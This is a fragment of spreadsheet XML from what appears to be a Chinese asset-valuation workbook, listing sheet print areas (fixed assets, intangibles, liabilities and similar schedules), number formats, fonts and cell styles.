    <definedName name="_xlnm.Print_Area" localSheetId="60">'4-8-3管道沟槽'!$B$1:$R$34</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="61">'4-8-4机器设备'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="61">'4-8-4机器设备'!$B$1:$S$34</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="62">'4-8-5车辆'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="62">'4-8-5车辆'!$B$1:$S$34</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="63">'4-8-6电子设备'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="63">'4-8-6电子设备'!$B$1:$S$34</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="64">'4-8-7固定资产清理'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="64">'4-8-7固定资产清理'!$B$1:$L$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="65">'4-9在建工程汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="65">'4-9在建工程汇总'!$B$1:$H$25</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="66">'4-9-1在建（土建）'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="66">'4-9-1在建（土建）'!$B$1:$N$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="67">'4-9-2在建（设备）'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="67">'4-9-2在建（设备）'!$B$1:$S$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="68">'4-9-3在建工程（工程物资）'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="68">'4-9-3在建工程（工程物资）'!$B$1:$N$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="69">'4-10生产性生物资产'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="69">'4-10生产性生物资产'!$B$1:$N$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="70">'4-11油气资产'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="70">'4-11油气资产'!$B$1:$O$28</definedName>
    <definedName name="_Fill" localSheetId="71" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="71" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="71">'4-12使用权资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="71">'4-12使用权资产'!$B$1:$K$30</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="72">'4-13无形资产汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="72">'4-13无形资产汇总'!$B$1:$H$25</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="73">'4-13-1无形-土地'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="73">'4-13-1无形-土地'!$B$1:$Q$30</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="74">'4-13-2无形-矿业权'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="74">'4-13-2无形-矿业权'!$B$1:$O$30</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="75">'4-13-3无形-其他'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="75">'4-13-3无形-其他'!$B$1:$L$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="76">'4-14开发支出'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="76">'4-14开发支出'!$B$1:$I$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="77">'4-15商誉'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="77">'4-15商誉'!$B$1:$I$26</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="78">'4-16长期待摊费用'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="78">'4-16长期待摊费用'!$B$1:$L$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="79">'4-17递延所得税资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="79">'4-17递延所得税资产'!$B$1:$I$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="80">'4-18其他非流动资产'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="80">'4-18其他非流动资产'!$B$1:$I$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="81">'5-流动负债汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="81">'5-流动负债汇总'!$B$1:$H$27</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="82">'5-1短期借款'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="83">'5-2交易性金融负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="83">'5-2交易性金融负债'!$B$1:$J$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="84">'5-3衍生金融负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="84">'5-3衍生金融负债'!$B$1:$K$31</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="85">'5-4应付票据'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="85">'5-4应付票据'!$B$1:$K$30</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="86">'5-5应付账款'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="86">'5-5应付账款'!$B$1:$M$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="87">'5-6预收款项'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="87">'5-6预收款项'!$B$1:$M$28</definedName>
    <definedName name="_Fill" localSheetId="88" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="88" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="88">'5-7合同负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="88">'5-7合同负债'!$B$1:$J$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="89">'5-8应付职工薪酬'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="89">'5-8应付职工薪酬'!$B$1:$I$26</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="90">'5-9应交税费'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="90">'5-9应交税费'!$B$1:$J$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="91">'5-10其他应付款汇总表'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="91">'5-10其他应付款汇总表'!$B$1:$H$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="92">'5-10-1应付利息'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="92">'5-10-1应付利息'!$B$1:$L$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="93">'5-10-2应付股利（利润）'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="93">'5-10-2应付股利（利润）'!$B$1:$J$27</definedName>
    <definedName name="_Fill" localSheetId="94" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="94" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="94">'5-10-3其他应付款'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="94">'5-10-3其他应付款'!$B$1:$M$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="95">'5-11持有待售负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="95">'5-11持有待售负债'!$B$1:$J$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="96">'5-12一年到期非流动负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="96">'5-12一年到期非流动负债'!$B$1:$N$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="97">'5-13其他流动负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="97">'5-13其他流动负债'!$B$1:$J$26</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="98">'6-非流动负债汇总'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="98">'6-非流动负债汇总'!$B$1:$H$27</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="99">'6-1长期借款'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="99">'6-1长期借款'!$B$1:$O$29</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="100">'6-2应付债券'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="100">'6-2应付债券'!$B$1:$L$28</definedName>
    <definedName name="_Fill" localSheetId="101" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="101" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="101">'6-3租赁负债'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="101">'6-3租赁负债'!$B$1:$K$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="102">'6-4长期应付款'!$1:$6</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="102">'6-4长期应付款'!$B$1:$O$30</definedName>
    <definedName name="_Fill" localSheetId="103" hidden="1">#REF!</definedName>
    <definedName name="lo" localSheetId="103" hidden="1">#REF!</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="103">'6-5长期应付职工薪酬'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="103">'6-5长期应付职工薪酬'!$B$1:$I$26</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="104">'6-6预计负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="104">'6-6预计负债'!$B$1:$J$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="105">'6-7递延收益'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="105">'6-7递延收益'!$B$1:$K$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="106">'6-8递延所得税负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="106">'6-8递延所得税负债'!$B$1:$I$28</definedName>
    <definedName name="_xlnm.Print_Titles" localSheetId="107">'6-9其他非流动负债'!$1:$5</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="107">'6-9其他非流动负债'!$B$1:$J$28</definedName>
    <definedName name="_xlnm.Print_Area" localSheetId="108">'8-减值准备汇总表'!$A$1:$H$84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4">
    <numFmt numFmtId="164" formatCode="0_ "/>
    <numFmt numFmtId="165" formatCode="#,##0.00_);[Red]\(#,##0.00\);_(* &quot;&quot;_)"/>
    <numFmt numFmtId="166" formatCode="0.00_);[Red]\(0.00\)"/>
    <numFmt numFmtId="167" formatCode="#,##0.00_);[Red]\-#,##0.00_);_(* &quot;&quot;_)"/>
    <numFmt numFmtId="168" formatCode="#,##0_);[Red]\-#,##0_);_(* &quot;&quot;_)"/>
    <numFmt numFmtId="169" formatCode="yyyy&quot;年&quot;m&quot;月&quot;d&quot;日&quot;;@"/>
    <numFmt numFmtId="170" formatCode="#,##0.00_ "/>
    <numFmt numFmtId="171" formatCode="yyyy&quot;年&quot;mm&quot;月&quot;"/>
    <numFmt numFmtId="172" formatCode="yyyy/mm/dd;@"/>
    <numFmt numFmtId="173" formatCode="#,##0.00_);[Black]\-#,##0.00_);_(* &quot;&quot;_)"/>
    <numFmt numFmtId="174" formatCode="#,##0.0000_);[Red]\-#,##0.0000_);_(* &quot;&quot;_)"/>
    <numFmt numFmtId="175" formatCode="#,##0.0000_);[Black]\-#,##0.0000_);_(* &quot;&quot;_)"/>
    <numFmt numFmtId="176" formatCode="_ * #,##0.00_ ;_ * \-#,##0.00_ ;_ * &quot;-&quot;??_ ;_ @_ "/>
    <numFmt numFmtId="177" formatCode="0.0000"/>
    <numFmt numFmtId="178" formatCode="0.0000_ "/>
    <numFmt numFmtId="179" formatCode="[DBNum2][$RMB]General;[Red][DBNum2][$RMB]General"/>
    <numFmt numFmtId="180" formatCode="_-#,##0_-;\(#,##0\);_-\ \ &quot;-&quot;_-;_-@_-"/>
    <numFmt numFmtId="181" formatCode="_-#,##0.00_-;\(#,##0.00\);_-\ \ &quot;-&quot;_-;_-@_-"/>
    <numFmt numFmtId="182" formatCode="mmm/dd/yyyy;_-\ &quot;N/A&quot;_-;_-\ &quot;-&quot;_-"/>
    <numFmt numFmtId="183" formatCode="mmm/yyyy;_-\ &quot;N/A&quot;_-;_-\ &quot;-&quot;_-"/>
    <numFmt numFmtId="184" formatCode="_-#,##0%_-;\(#,##0%\);_-\ &quot;-&quot;_-"/>
    <numFmt numFmtId="185" formatCode="_-#,###,_-;\(#,###,\);_-\ \ &quot;-&quot;_-;_-@_-"/>
    <numFmt numFmtId="186" formatCode="_-#,###.00,_-;\(#,###.00,\);_-\ \ &quot;-&quot;_-;_-@_-"/>
    <numFmt numFmtId="187" formatCode="_-#0&quot;.&quot;0,_-;\(#0&quot;.&quot;0,\);_-\ \ &quot;-&quot;_-;_-@_-"/>
    <numFmt numFmtId="188" formatCode="_-#0&quot;.&quot;0000_-;\(#0&quot;.&quot;0000\);_-\ \ &quot;-&quot;_-;_-@_-"/>
    <numFmt numFmtId="189" formatCode="_-* #,##0_-;\-* #,##0_-;_-* &quot;-&quot;??_-;_-@_-"/>
    <numFmt numFmtId="190" formatCode="&quot;\&quot;#,##0;[Red]&quot;\&quot;&quot;\&quot;&quot;\&quot;&quot;\&quot;&quot;\&quot;&quot;\&quot;&quot;\&quot;\-#,##0"/>
    <numFmt numFmtId="191" formatCode="_-* #,##0.00_-;\-* #,##0.00_-;_-* &quot;-&quot;??_-;_-@_-"/>
    <numFmt numFmtId="192" formatCode="#,##0.0"/>
    <numFmt numFmtId="193" formatCode="_(&quot;$&quot;* #,##0.00_);_(&quot;$&quot;* \(#,##0.00\);_(&quot;$&quot;* &quot;-&quot;??_);_(@_)"/>
    <numFmt numFmtId="194" formatCode="_([$€-2]* #,##0.00_);_([$€-2]* \(#,##0.00\);_([$€-2]* &quot;-&quot;??_)"/>
    <numFmt numFmtId="195" formatCode="#,##0\ &quot; &quot;;\(#,##0\)\ ;&quot;—&quot;&quot; &quot;&quot; &quot;&quot; &quot;&quot; &quot;"/>
    <numFmt numFmtId="196" formatCode="#,##0.00&quot;￥&quot;;\-#,##0.00&quot;￥&quot;"/>
    <numFmt numFmtId="197" formatCode="_-* #,##0.00&quot;￥&quot;_-;\-* #,##0.00&quot;￥&quot;_-;_-* &quot;-&quot;??&quot;￥&quot;_-;_-@_-"/>
    <numFmt numFmtId="198" formatCode="0.000%"/>
    <numFmt numFmtId="199" formatCode="_-* #,##0&quot;￥&quot;_-;\-* #,##0&quot;￥&quot;_-;_-* &quot;-&quot;&quot;￥&quot;_-;_-@_-"/>
    <numFmt numFmtId="200" formatCode="0.0%"/>
    <numFmt numFmtId="201" formatCode="_-* #,##0_-;\-* #,##0_-;_-* &quot;-&quot;_-;_-@_-"/>
    <numFmt numFmtId="202" formatCode="&quot;$&quot;#,##0;\-&quot;$&quot;#,##0"/>
    <numFmt numFmtId="203" formatCode="#,##0.00&quot;￥&quot;;[Red]\-#,##0.00&quot;￥&quot;"/>
    <numFmt numFmtId="204" formatCode="_(&quot;$&quot;* #,##0_);_(&quot;$&quot;* \(#,##0\);_(&quot;$&quot;* &quot;-&quot;??_);_(@_)"/>
    <numFmt numFmtId="205" formatCode="mmm\ dd\,\ yy"/>
    <numFmt numFmtId="206" formatCode="_(&quot;$&quot;* #,##0.0_);_(&quot;$&quot;* \(#,##0.0\);_(&quot;$&quot;* &quot;-&quot;??_);_(@_)"/>
    <numFmt numFmtId="207" formatCode="mm/dd/yy_)"/>
  </numFmts>
  <fonts count="121">
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="MS Sans Serif"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <sz val="9"/>
    </font>
    <font>
      <name val="蹈框"/>
      <charset val="134"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="10"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="16"/>
      <u val="double"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <sz val="12"/>
      <u val="double"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color indexed="10"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color indexed="8"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color indexed="12"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color indexed="12"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="10"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="10"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="12"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="12"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="黑体"/>
      <charset val="134"/>
      <color rgb="FF000000"/>
      <sz val="18"/>
    </font>
    <font>
      <name val="黑体"/>
      <charset val="134"/>
      <sz val="18"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <sz val="11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黑体"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="16"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color indexed="8"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="黑体"/>
      <charset val="134"/>
      <color indexed="8"/>
      <sz val="18"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color indexed="8"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="黑体"/>
      <charset val="134"/>
      <color indexed="8"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="8"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="16"/>
    </font>
    <font>
      <name val="SimSun"/>
      <charset val="134"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="宋体-简"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <sz val="20"/>
    </font>
    <font>
      <name val="黑体"/>
      <charset val="134"/>
      <sz val="20"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color rgb="FFFF0000"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color rgb="FFFF0000"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color rgb="FF3F3F76"/>
      <sz val="12"/>
      <scheme val="minor"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color rgb="FFFF0000"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color rgb="FFFF0000"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color rgb="FFFF0000"/>
      <sz val="9"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color rgb="FF000000"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color rgb="FF3F3F76"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="黑体"/>
      <charset val="134"/>
      <sz val="16"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color rgb="FF000000"/>
      <sz val="11"/>
      <scheme val="minor"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <sz val="11"/>
      <scheme val="minor"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <color rgb="FFFF0000"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color rgb="FF800080"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color rgb="FF800080"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color rgb="FF000000"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <color theme="1"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color theme="1"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color rgb="FF000000"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color rgb="FF000000"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <color rgb="FF000000"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <color theme="1"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <color theme="1"/>
      <sz val="10.5"/>
    </font>
    <font>
      <name val="Times New Roman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12"/>
      <sz val="12"/>
      <u val="single"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <color indexed="8"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="???"/>
      <charset val="134"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <sz val="10"/>
      <u val="singleAccounting"/>
      <vertAlign val="subscript"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <i val="1"/>
      <sz val="9"/>
    </font>
    <font>
      <name val="Helv"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="MS Sans Serif"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <i val="1"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="MS Serif"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="8"/>
    </font>
    <font>
      <name val="Courier"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="8"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="MS Serif"/>
      <charset val="134"/>
      <color indexed="16"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Arial"/>
      <charset val="134"/>
      <sz val="8"/>
    </font>
    <font>
      <name val="隶书"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="20"/>
      <sz val="24"/>
    </font>
    <font>
      <name val="Helv"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="13"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <i val="1"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Helv"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Small Fonts"/>
      <charset val="134"/>
      <sz val="7"/>
    </font>
    <font>
      <name val="MS Sans Serif"/>
      <charset val="134"/>
      <color indexed="8"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Tms Rmn"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <color indexed="9"/>
      <sz val="14"/>
    </font>
    <font>
      <name val="MS Sans Serif"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="MS Sans Serif"/>
      <charset val="134"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Helv"/>
      <charset val="134"/>
      <sz val="10"/>
    </font>
    <font>
      <name val="黑体"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="14"/>
    </font>
    <font>
      <name val="바탕체"/>
      <charset val="129"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="ＭＳ Ｐゴシック"/>
      <charset val="128"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="16"/>
      <u val="double"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <b val="1"/>
      <sz val="11"/>
      <scheme val="minor"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <color indexed="10"/>
      <sz val="12"/>
    </font>
    <font>
      <name val="Times New Roman"/>
      <charset val="134"/>
      <sz val="9"/>
    </font>
    <font>
      <name val="宋体"/>
      <charset val="134"/>
      <sz val="9"/>
    </font>
    <font>
      <name val="宋体"/>
      <sz val="11"/>
    </font>
    <font>
      <name val="宋体"/>
      <color rgb="000563C1"/>
      <sz val="11"/>
      <u val="single"/>
    </font>
    <font>
      <name val="宋体"/>
      <b val="1"/>
      <sz val="11"/>
    </font>
  </fonts>
  <fills count="48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3">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="43" fontId="0" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="44" fontId="65" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="9" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="41" fontId="65" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="42" fontId="65" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="52" fillId="0" borderId="0" applyAlignment="1" applyProtection="1">
      <alignment vertical="top"/>
      <protection locked="0" hidden="0"/>
    </xf>
    <xf numFmtId="0" fontId="66" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="65" fillId="13" borderId="22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9" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="70" fillId="0" borderId="23" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="71" fillId="0" borderId="23" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="72" fillId="0" borderId="24" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="72" fillId="0" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="73" fillId="11" borderId="15" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="74" fillId="14" borderId="25" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="75" fillId="14" borderId="15" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="76" fillId="15" borderId="26" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="77" fillId="0" borderId="27" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="78" fillId="0" borderId="28" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="79" fillId="16" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="80" fillId="17" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="81" fillId="18" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="82" fillId="19" borderId="0" applyAlignment="1">
      <alignment vertical="center"/>
